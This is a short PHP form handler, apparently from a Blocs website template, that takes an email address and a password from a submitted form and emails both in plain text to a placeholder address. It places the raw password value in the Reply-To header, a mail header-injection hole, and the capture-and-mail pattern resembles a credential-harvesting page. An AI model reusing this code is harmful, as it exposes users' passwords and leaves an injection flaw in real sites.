<?php	
	if (empty($_POST['email_38456']) && strlen($_POST['email_38456']) == 0 || empty($_POST['password_38456']) && strlen($_POST['password_38456']) == 0)
	{
		return false;
	}
	
	$email_38456 = $_POST['email_38456'];
	$password_38456 = $_POST['password_38456'];
	
	$to = 'receiver@yoursite.com'; // Email submissions are sent to this email

	// Create email	
	$email_subject = "Message from a Blocs website.";
	$email_body = "You have received a new message. \n\n".
				  "Email_38456: $email_38456 \nPassword_38456: $password_38456 \n";
	$headers = "MIME-Version: 1.0\r\nContent-type: text/plain; charset=UTF-8\r\n";	
	$headers .= "From: contact@yoursite.com\n";
	$headers .= "Reply-To: $password_38456";	
	
	mail($to,$email_subject,$email_body,$headers); // Post message
	return true;			
?>